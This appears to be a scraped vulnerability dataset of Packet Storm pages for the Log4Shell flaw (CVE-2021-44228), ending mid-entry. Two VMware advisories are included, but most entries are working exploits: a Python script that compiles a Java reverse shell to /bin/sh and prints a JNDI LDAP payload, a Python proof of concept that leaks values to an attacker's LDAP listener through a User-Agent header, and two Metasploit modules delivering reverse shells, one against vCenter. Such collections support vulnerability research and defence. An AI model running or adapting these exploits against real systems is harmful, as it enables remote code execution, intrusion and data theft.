[
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "# Exploit Title: Apache Log4j 2 - Remote Code Execution (RCE)\n# Date: 11/12/2021\n# Exploit Authors: kozmer, z9fr, svmorris\n# Vendor Homepage: https://logging.apache.org/log4j/2.x/\n# Software Link: https://github.com/apache/logging-log4j2\n# Version: versions 2.0-beta-9 and 2.14.1.\n# Tested on: Linux\n# CVE: CVE-2021-44228\n# Github repo: https://github.com/kozmer/log4j-shell-poc\n\nimport subprocess\nimport os\nimport sys\n\njavaver = subprocess.call(['./jdk1.8.0_20/bin/java', '-version']) #stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)\nprint(\"\\n\")\n\nuserip = input(\"[+] Enter IP for LDAPRefServer & Shell: \")\nuserport = input(\"[+] Enter listener port for LDAPRefServer: \")\nlport = input(\"[+] Set listener port for shell: \")\n\ndef payload():\n\n    javapayload = (\"\"\"\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class Exploit {\n\n  public Exploit() throws Exception {\n    String host=\"%s\";\n    int port=%s;\n    String cmd=\"/bin/sh\";\n    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\n    Socket s=new Socket(host,port);\n    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\n    OutputStream po=p.getOutputStream(),so=s.getOutputStream();\n    while(!s.isClosed()) {\n      while(pi.available()>0)\n        so.write(pi.read());\n      while(pe.available()>0)\n        so.write(pe.read());\n      while(si.available()>0)\n        po.write(si.read());\n      so.flush();\n      po.flush();\n      Thread.sleep(50);\n      try {\n        p.exitValue();\n        break;\n      }\n      catch (Exception e){\n      }\n    };\n    p.destroy();\n    s.close();\n  }\n}\n\n\"\"\") % (userip,lport)\n\n    f = open(\"Exploit.java\", \"w\")\n    f.write(javapayload)\n    f.close()\n\n    os.system('./jdk1.8.0_20/bin/javac Exploit.java')\n\n    sendme = (\"${jndi:ldap://%s:1389/a}\") % (userip)\n    print(\"[+] Send me: \"+sendme+\"\\n\")\n\ndef marshalsec():\n    os.system(\"./jdk1.8.0_20/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer\nhttp://{}:{}/#Exploit\".format\n(userip, userport))\n\nif __name__== \"__main__\":\n    payload()\n    marshalsec()\n            \n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "Apache Log4j2 2.14.1 Remote Code Execution ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\nVMSA-2021-0028 - VMware Response to Apache Log4j Remote Code Execution Vulnerability (CVE-2021-44228)\n\nPlease see the updated advisory here: https://www.vmware.com/security/advisories/VMSA-2021-0028.html\n\nChangelog:\n\n2021-12-10: VMSA-2021-0028\nInitial security advisory.\n\n2021-12-11: VMSA-2021-0028.1\nUpdated advisory with workaround information for multiple products including vCenter Server Appliance, vRealize Operations, Horizon, vRealize Log Insight, Unified Access Gateway.\n\n2021-12-13: VMSA-2021-0028.2\nRevised advisory with updates to multiple products.\n•  VMware HCX\n•  VMware NSX-T Data Center\n•  VMware WorkspaceOne Access\n•  VMware Identity Manager \n•  VMware vRealize Operations Cloud Proxy\n•  VMware vRealize Lifecycle Manager\n•  VMware Site Recovery Manager, vSphere Replication\n•  VMware Carbon Black Cloud Workload Appliance\n•  VMware Carbon Black EDR Server\n•  VMware Tanzu GemFire\n•  VMware Tanzu Greenplum\n•  VMware Tanzu Operations Manager\n•  VMware Tanzu Application Service for VMs\n•  VMware Tanzu Kubernetes Grid Integrated Edition\n•  VMware Tanzu Observability by Wavefront Nozzle\n•  Healthwatch for Tanzu Application Service\n•  Spring Cloud Services for VMware Tanzu\n•  API Portal for VMware Tanzu\n•  Single Sign-On for VMware Tanzu Application Service\n•  App Metrics\n•  VMware vCenter Cloud Gateway\n•  VMware Cloud Foundation\n•  VMware Workspace ONE Access Connector\n•  VMware Horizon DaaS\n•  VMware Horizon Cloud Connector\n•  VMware NSX Data Center for vSphere\n•  VMware AppDefense Appliance\n•  VMware Cloud Director Object Storage Extension\n\nYou are receiving this alert because you are subscribed to the VMware Security Announcements mailing list. To modify your subscription or unsubscribe please visit https://lists.vmware.com/mailman/listinfo/security-announce.\n-----BEGIN PGP SIGNATURE-----\n\niF0EARECAB0WIQQATpKvqUhghXJhavw/xTN5GfcH8QUCYbehqwAKCRA/xTN5GfcH\n8ZLBAJsGh928Q1Fu4d2FixHS+5hbYkGAZACg6N2p03IJVIl6kp1X4Cnuft7OWpM=\n=V4Eq\n-----END PGP SIGNATURE-----\n\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "VMware Security Advisory 2021-0028 ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165260/VMware-Security-Advisory-2021-0028.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "# Exploit Title: Apache Log4j2 2.14.1 - Information Disclosure\n# Date: 12/12/2021\n# Exploit Author: leonjza\n# Vendor Homepage: https://logging.apache.org/log4j/2.x/\n# Version: <= 2.14.1\n# CVE: CVE-2021-44228\n\n#!/usr/bin/env python3\n\n# Pure python ENV variable leak PoC for CVE-2021-44228\n# Original PoC: https://twitter.com/Black2Fan/status/1470281005038817284\n#\n# 2021 @leonjza\n\nimport argparse\nimport socketserver\nimport threading\nimport time\n\nimport requests\n\nLDAP_HEADER = b'\\x30\\x0c\\x02\\x01\\x01\\x61\\x07\\x0a\\x01\\x00\\x04\\x00\\x04\\x00\\x0a'\n\n\nclass ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self) -> None:\n        print(f' i| new connection from {self.client_address[0]}')\n\n        sock = self.request\n        sock.recv(1024)\n        sock.sendall(LDAP_HEADER)\n\n        data = sock.recv(1024)\n        data = data[9:]  # strip header\n\n        # example response\n        #\n        # ('Java version 11.0.13\\n'\n        #  '\\x01\\x00\\n'\n        #  '\\x01\\x03\\x02\\x01\\x00\\x02\\x01\\x00\\x01\\x01\\x00\\x0b'\n        #  'objectClass0\\x00\\x1b0\\x19\\x04\\x172.16.840.1.113730.3.4.2')\n\n        data = data.decode(errors='ignore').split('\\n')[0]\n        print(f' v| extracted value: {data}')\n\n\nclass ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):\n    pass\n\n\ndef main():\n    parser = argparse.ArgumentParser(description='a simple log4j\n<=2.14 information disclosure poc '\n                                                 '(ref:\nhttps://twitter.com/Black2Fan/status/1470281005038817284)')\n    parser.add_argument('--target', '-t', required=True, help='target uri')\n    parser.add_argument('--listen-host', default='0.0.0.0',\n                        help='exploit server host to listen on\n(default: 127.0.0.1)')\n    parser.add_argument('--listen-port', '-lp', default=8888,\nhelp='exploit server port to listen on (default: 8888)')\n    parser.add_argument('--exploit-host', '-eh', required=True,\ndefault='127.0.0.1',\n                        help='host where (this) exploit server is reachable')\n    parser.add_argument('--leak', '-l', default='${java:version}',\n                        help='value to leak. '\n                             'see:\nhttps://twitter.com/Rayhan0x01/status/1469571563674505217 '\n                             '(default: ${java:version})')\n    args = parser.parse_args()\n\n    print(f' i| starting server on {args.listen_host}:{args.listen_port}')\n    server = ThreadedTCPServer((args.listen_host, args.listen_port),\nThreadedTCPRequestHandler)\n\n    serv_thread = threading.Thread(target=server.serve_forever)\n    serv_thread.daemon = True\n    serv_thread.start()\n    time.sleep(1)\n    print(f' i| server started')\n\n    payload = f'${{jndi:ldap://{args.exploit_host}:{args.listen_port}/{args.leak}}}'\n    print(f' i| sending exploit payload {payload} to {args.target}')\n\n    try:\n        r = requests.get(args.target, headers={'User-Agent': payload})\n        print(f' i| response status code: {r.status_code}')\n        print(f' i| response: {r.text}')\n    except Exception as e:\n        print(f' e| failed to make request: {e}')\n    finally:\n        server.shutdown()\n        server.server_close()\n\n\nif __name__ == '__main__':\n    main()\n            \n\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "Apache Log4j2 2.14.1 Information Disclosure ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\nVMSA-2021-0028 - VMware Response to Apache Log4j Remote Code Execution Vulnerability (CVE-2021-44228)\n\nPlease see the updated advisory here: https://www.vmware.com/security/advisories/VMSA-2021-0028.html\n\nChangelog:\n\n2021-12-17: VMSA-2021-0028.4\nRevised advisory with updates to multiple products.\n\nVMware Unified Access Gateway\nVMware Carbon Black Workload Appliance\nVMware Site Recovery Manager, vSphere Replication\nVMware Tanzu GemFire\nVMware Tanzu GemFire for VMs\nVMware Tanzu Operations Manager\nVMware Tanzu Application Service for VMs\nVMware Horizon Agents Installer\n\nYou are receiving this alert because you are subscribed to the VMware Security Announcements mailing list. To modify your subscription or unsubscribe please visit https://lists.vmware.com/mailman/listinfo/security-announce.\n-----BEGIN PGP SIGNATURE-----\n\niF0EARECAB0WIQQATpKvqUhghXJhavw/xTN5GfcH8QUCYbzoagAKCRA/xTN5GfcH\n8bBbAJ0bsdYZSnXwVMZoNoazBVM5ymEnKwCg8hzSaUGl1t5rFCKw/QRvfE4yRM4=\n=Omsr\n-----END PGP SIGNATURE-----\n\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "VMware Security Advisory 2021-0028.4 ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165371/VMware-Security-Advisory-2021-0028.4.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::JavaDeserialization\n  include Msf::Exploit::Java\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::LDAP::Server\n  include Msf::Exploit::Remote::CheckModule\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'Log4Shell HTTP Header Injection',\n      'Description' => %q{\n        Versions of Apache Log4j2 impacted by CVE-2021-44228 which allow JNDI features used in configuration,\n        log messages, and parameters, do not protect against attacker controlled LDAP and other JNDI related endpoints.\n\n        This module will exploit an HTTP end point with the Log4Shell vulnerability by injecting a format message that\n        will trigger an LDAP connection to Metasploit and load a payload.\n\n        The Automatic target delivers a Java payload using remote class loading. This requires Metasploit to run an HTTP\n        server in addition to the LDAP server that the target can connect to. The targeted application must have the\n        trusted code base option enabled for this technique to work.\n\n        The non-Automatic targets deliver a payload via a serialized Java object. This does not require Metasploit to\n        run an HTTP server and instead leverages the LDAP server to deliver the serialized object. The target\n        application in this case must be compatible with the user-specified JAVA_GADGET_CHAIN option.\n      },\n      'Author' => [\n        'Michael Schierl', # Technical guidance, examples, and patience - all of the Jedi stuff\n        'juan vazquez', # 2011-3544 building blocks reused in this module\n        'sinn3r', # 2011-3544 building blocks reused in this module\n        'Spencer McIntyre', # Kickoff on 2021-44228 work, improvements, and polish required for formal acceptance\n        'RageLtMan <rageltman[at]sempervictus>' # Metasploit module and infrastructure\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'SRVPORT' => 389,\n        'WfsDelay' => 30,\n        'CheckModule' => 'auxiliary/scanner/http/log4shell_scanner'\n      },\n      'Targets' => [\n        [\n          'Automatic', {\n            'Platform' => 'java',\n            'Arch' => [ARCH_JAVA],\n            'RemoteLoad' => true,\n            'DefaultOptions' => {\n              'PAYLOAD' => 'java/shell_reverse_tcp'\n            }\n          }\n        ],\n        [\n          'Windows', {\n            'Platform' => 'win',\n            'RemoteLoad' => false,\n            'DefaultOptions' => {\n              'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n            }\n          },\n        ],\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'RemoteLoad' => false,\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION],\n        'RelatedModules' => [ 'auxiliary/scanner/http/log4shell_scanner' ]\n      },\n      'Stance' => Msf::Exploit::Stance::Aggressive\n    )\n    register_options([\n      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),\n      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),\n      OptString.new('HTTP_HEADER', [ false, 'The HTTP header to inject into' ]),\n      OptEnum.new('JAVA_GADGET_CHAIN', [\n        true, 'The ysoserial payload to use for deserialization', 'CommonsBeanutils1',\n        Msf::Util::JavaDeserialization.ysoserial_payload_names\n      ], conditions: %w[TARGET != Automatic]),\n      OptPort.new('HTTP_SRVPORT', [true, 'The HTTP server port', 8080], conditions: %w[TARGET == Automatic]),\n      OptBool.new('LDAP_AUTH_BYPASS', [true, 'Ignore LDAP client authentication', true])\n    ])\n  end\n\n  def check\n    validate_configuration!\n    # set these scanner options as appropriate based on the config\n    datastore['URIS_FILE'] = nil\n    if !datastore['HTTP_HEADER'].blank?\n      datastore['HEADERS_FILE'] = nil\n    end\n\n    @checkcode = super\n  end\n\n  def jndi_string\n    \"${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/dc=#{Rex::Text.rand_text_alpha_lower(6)},dc=#{Rex::Text.rand_text_alpha_lower(3)}}\"\n  end\n\n  def resource_url_string\n    \"http#{datastore['SSL'] ? 's' : ''}://#{datastore['SRVHOST']}:#{datastore['HTTP_SRVPORT']}#{resource_uri}\"\n  end\n\n  #\n  # Use Ruby Java bridge to create a Java-natively-serialized object\n  #\n  # @return [String] Marshalled serialized byteArray of the loader class\n  def byte_array_payload(pay_class = 'metasploit.PayloadFactory')\n    jar = generate_payload.encoded_jar\n    serialized_class_from_jar(jar, pay_class)\n  end\n\n  #\n  # Insert PayloadFactory in Java payload JAR\n  #\n  # @param jar [Rex::Zip::Jar] payload JAR to update\n  # @return [Rex::Zip::Jar] updated payload JAR\n  def inject_jar_payload_factory(jar = generate_payload.encoded_jar)\n    # From exploits/multi/browser/java_rhino - should probably go to lib\n    paths = [\n      [ 'metasploit/PayloadFactory.class' ]\n    ]\n    paths.each do |path|\n      1.upto(path.length - 1) do |idx|\n        full = path[0, idx].join('/') + '/'\n        jar.add_file(full, '') unless jar.entries.map(&:name).include?(full)\n      end\n      File.open(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', path), 'rb') do |fd|\n        data = fd.read(fd.stat.size)\n        jar.add_file(path.join('/'), data)\n      end\n    end\n    jar\n  end\n\n  #\n  # Generate and serialize the payload as an LDAP search response\n  #\n  # @param msg_id [Integer] LDAP message identifier\n  # @param base_dn [Sting] LDAP distinguished name\n  #\n  # @return [Array] packed BER sequence\n  def serialized_payload(msg_id, base_dn, pay_class = 'metasploit.PayloadFactory')\n    if target['RemoteLoad']\n      attrs = [\n        [ 'javaClassName'.to_ber, [ pay_class.to_ber].to_ber_set ].to_ber_sequence,\n        [ 'javaFactory'.to_ber, [ pay_class.to_ber].to_ber_set ].to_ber_sequence,\n        [ 'objectClass'.to_ber, [ 'javaNamingReference'.to_ber ].to_ber_set ].to_ber_sequence,\n        [ 'javaCodebase'.to_ber, [ resource_url_string.to_ber ].to_ber_set ].to_ber_sequence,\n      ]\n    else\n      java_payload = generate_java_deserialization_for_payload(datastore['JAVA_GADGET_CHAIN'], payload)\n      # vprint_good(\"Serialized java payload: #{java_payload}\")\n      attrs = [\n        [ 'javaClassName'.to_ber, [ rand_text_alphanumeric(8..15).to_ber ].to_ber_set ].to_ber_sequence,\n        [ 'javaSerializedData'.to_ber, [ java_payload.to_ber ].to_ber_set ].to_ber_sequence\n      ]\n    end\n    appseq = [\n      base_dn.to_ber,\n      attrs.to_ber_sequence\n    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)\n    [ msg_id.to_ber, appseq ].to_ber_sequence\n  end\n\n  ## LDAP service callbacks\n  #\n  # Handle incoming requests via service mixin\n  #\n  def on_dispatch_request(client, data)\n    return if data.strip.empty?\n\n    data.extend(Net::BER::Extensions::String)\n    begin\n      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))\n      vprint_status(\"LDAP request data remaining: #{data}\") unless data.empty?\n      resp = case pdu.app_tag\n             when Net::LDAP::PDU::BindRequest # bind request\n               client.authenticated = true\n               service.encode_ldap_response(\n                 pdu.message_id,\n                 Net::LDAP::ResultCodeSuccess,\n                 '',\n                 '',\n                 Net::LDAP::PDU::BindResult\n               )\n             when Net::LDAP::PDU::SearchRequest # search request\n               if client.authenticated || datastore['LDAP_AUTH_BYPASS']\n                 client.write(serialized_payload(pdu.message_id, pdu.search_parameters[:base_object]))\n                 service.encode_ldap_response(pdu.message_id, Net::LDAP::ResultCodeSuccess, '', 'Search success', Net::LDAP::PDU::SearchResult)\n               else\n                 service.encode_ldap_response(pdu.message_i, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)\n               end\n             else\n               vprint_status(\"Client sent unexpected request #{pdu.app_tag}\")\n               client.close\n             end\n      resp.nil? ? client.close : on_send_response(client, resp)\n    rescue StandardError => e\n      print_error(\"Failed to handle LDAP request due to #{e}\")\n      client.close\n    end\n    resp\n  end\n\n  ## HTTP service callbacks\n  #\n  # Handle HTTP requests and responses\n  #\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    vprint_good(\"Payload requested by #{cli.peerhost} using #{agent}\")\n    pay = regenerate_payload(cli)\n    jar = inject_jar_payload_factory(pay.encoded_jar)\n    send_response(cli, 200, 'OK', jar)\n  end\n\n  #\n  # Create an HTTP response and then send it\n  #\n  def send_response(cli, code, message = 'OK', html = '')\n    proto = Rex::Proto::Http::DefaultProtocol\n    res = Rex::Proto::Http::Response.new(code, message, proto)\n    res['Content-Type'] = 'application/java-archive'\n    res.body = html\n    cli.send_response(res)\n  end\n\n  def exploit\n    validate_configuration!\n    if datastore['HTTP_HEADER'].blank?\n      targetinfo = (@checkcode&.details || []).reject { |ti| ti[:headers]&.empty? }.first\n      http_header = targetinfo[:headers].keys.first if targetinfo\n      fail_with(Failure::BadConfig, 'No HTTP_HEADER was specified and none were found automatically') unless http_header\n\n      print_good(\"Automatically identified vulnerable header: #{http_header}\")\n    else\n      http_header = datastore['HTTP_HEADER']\n    end\n\n    # LDAP service\n    start_service\n    # HTTP service\n    start_http_service if target['RemoteLoad']\n    # HTTP request initiator\n    send_request_raw(\n      'uri' => normalize_uri(target_uri),\n      'method' => datastore['HTTP_METHOD'],\n      'headers' => { http_header => jndi_string }\n    )\n    sleep(datastore['WfsDelay'])\n    handler\n  ensure\n    cleanup\n  end\n\n  #\n  # Kill HTTP & LDAP services (shut them down and clear resources)\n  #\n  def cleanup\n    # Clean and stop HTTP server\n    if @http_service\n      begin\n        @http_service.remove_resource(datastore['URIPATH'])\n        @http_service.deref\n        @http_service.stop\n        @http_service = nil\n      rescue StandardError => e\n        print_error(\"Failed to stop http server due to #{e}\")\n      end\n    end\n    super\n  end\n\n  private\n\n  # Boilerplate HTTP service code\n  #\n  # Returns the configured (or random, if not configured) URI path\n  #\n  def resource_uri\n    path = datastore['URIPATH'] || rand_text_alphanumeric(rand(8..15)) + '.jar'\n    path = '/' + path if path !~ %r{^/}\n    if path !~ /\\.jar$/\n      print_status(\"Appending .jar extension to #{path} as we don't yet serve classpaths\")\n      path += '.jar'\n    end\n    datastore['URIPATH'] = path\n    return path\n  end\n\n  #\n  # Handle the HTTP request and return a response.  Code borrowed from:\n  # msf/core/exploit/http/server.rb\n  #\n  def start_http_service(opts = {})\n    comm = datastore['ListenerComm']\n    if (comm.to_s == 'local')\n      comm = ::Rex::Socket::Comm::Local\n    else\n      comm = nil\n    end\n    # Default the server host / port\n    opts = {\n      'ServerHost' => datastore['SRVHOST'],\n      'ServerPort' => datastore['HTTP_SRVPORT'],\n      'Comm' => comm\n    }.update(opts)\n    # Start a new HTTP server\n    @http_service = Rex::ServiceManager.start(\n      Rex::Proto::Http::Server,\n      opts['ServerPort'].to_i,\n      opts['ServerHost'],\n      datastore['SSL'],\n      {\n        'Msf' => framework,\n        'MsfExploit' => self\n      },\n      opts['Comm'],\n      datastore['SSLCert']\n    )\n    @http_service.server_name = datastore['HTTP::server_name']\n    # Default the procedure of the URI to on_request_uri if one isn't\n    # provided.\n    uopts = {\n      'Proc' => method(:on_request_uri),\n      'Path' => resource_uri\n    }.update(opts['Uri'] || {})\n    proto = (datastore['SSL'] ? 'https' : 'http')\n    print_status(\"Serving Java code on: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}\")\n    if (opts['ServerHost'] == '0.0.0.0')\n      print_status(\" Local IP: #{proto}://#{Rex::Socket.source_address}:#{opts['ServerPort']}#{uopts['Path']}\")\n    end\n    # Add path to resource\n    @service_path = uopts['Path']\n    @http_service.add_resource(uopts['Path'], uopts)\n  end\n\n  def validate_configuration!\n    fail_with(Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['SRVHOST'])\n    if datastore['HTTP_HEADER'].blank? && !datastore['AutoCheck']\n      fail_with(Failure::BadConfig, 'Either the AutoCheck option must be enabled or an HTTP_HEADER must be specified.')\n    end\n  end\nend\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
    "successful_fetch": 1,
    "title": "Log4Shell HTTP Header Injection ≈ Packet Storm",
    "url": "http://packetstormsecurity.com/files/165532/Log4Shell-HTTP-Header-Injection.html",
    "vulnerability_id": "GHSA-jfh8-c2jp-5v3q"
  },
  {
    "vuln_description": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.",
    "code": [
      {
        "code": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::JndiInjection\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::CheckModule\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'VMware vCenter Server Unauthenticated JNDI Injection RCE (via Log4Shell)',\n      'Description' => %q{\n        VMware vCenter Server is affected by the Log4Shell vulnerability whereby a JNDI string can sent to the server\n        that will cause it to connect to the attacker and deserialize a malicious Java object. This results in OS\n        command execution in the context of the root user in the case of the Linux virtual appliance and SYSTEM on\n        Windows.\n\n        This module will start an LDAP server that the target will need to connect to. This exploit uses the logon page\n        vector.\n      },\n      'Author' => [\n        'Spencer McIntyre', # this exploit module and JNDI/LDAP lib stuff\n        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff\n        'jbaines-r7', # vCenter research\n        'w3bd3vil' # vCenter PoC https://twitter.com/w3bd3vil/status/1469814463414951937\n      ],\n      'References' => [\n        [ 'CVE', '2021-44228' ],\n        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis'],\n        [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2021-0028.html' ],\n        [ 'URL', 'https://twitter.com/w3bd3vil/status/1469814463414951937' ]\n      ],\n      'DisclosureDate' => '2021-12-09',\n      'License' => MSF_LICENSE,\n      'DefaultOptions' => {\n        'RPORT' => 443,\n        'SSL' => true,\n        'SRVPORT' => 389,\n        'WfsDelay' => 30,\n        'CheckModule' => 'auxiliary/scanner/http/log4shell_scanner'\n      },\n      'Targets' => [\n        [\n          'Windows', {\n            'Platform' => 'win'\n          },\n        ],\n        [\n          'Linux', {\n            'Platform' => 'unix',\n            'Arch' => [ARCH_CMD],\n            'DefaultOptions' => {\n              'PAYLOAD' => 'cmd/unix/reverse_bash'\n            }\n          },\n        ]\n      ],\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [IOC_IN_LOGS],\n        'AKA' => ['Log4Shell', 'LogJam'],\n        'Reliability' => [REPEATABLE_SESSION],\n        'RelatedModules' => [\n          'auxiliary/scanner/http/log4shell_scanner',\n          'exploit/multi/http/log4shell_header_injection'\n        ]\n      }\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    validate_configuration!\n\n    return Exploit::CheckCode::Unknown if tenant.nil?\n\n    super\n  end\n\n  def check_options\n    {\n      'LDAP_TIMEOUT' => datastore['WfsDelay'],\n      'HTTP_HEADER' => 'X-Forwarded-For',\n      'TARGETURI' => normalize_uri(target_uri, 'websso', 'SAML2', 'SSO', tenant) + '?SAMLRequest=',\n      'HEADERS_FILE' => nil,\n      'URIS_FILE' => nil\n    }\n  end\n\n  def build_ldap_search_response_payload\n    return [] if @search_received\n\n    @search_received = true\n\n    print_good('Delivering the serialized Java object to execute the payload...')\n    build_ldap_search_response_payload_inline('BeanFactory')\n  end\n\n  def tenant\n    return @tenant unless @tenant.nil?\n\n    res = send_request_cgi('uri' => normalize_uri(target_uri, 'ui', 'login'))\n    return nil unless res&.code == 302\n    return nil unless res.headers['Location'] =~ %r{websso/SAML2/SSO/([^/]+)\\?}\n\n    @tenant = Regexp.last_match(1)\n  end\n\n  def trigger\n    @search_received = false\n    # HTTP request initiator\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri, 'websso', 'SAML2', 'SSO', tenant) + '?SAMLRequest=',\n      'headers' => { 'X-Forwarded-For' => jndi_string }\n    )\n  end\n\n  def exploit\n    validate_configuration!\n\n    start_service\n    trigger\n\n    sleep(datastore['WfsDelay'])\n    handler\n  ensure\n    cleanup\n  end\nend\n",
        "preamble": "Change Mirror\nDownload"
      }
    ],
    "content_type": "text/html",
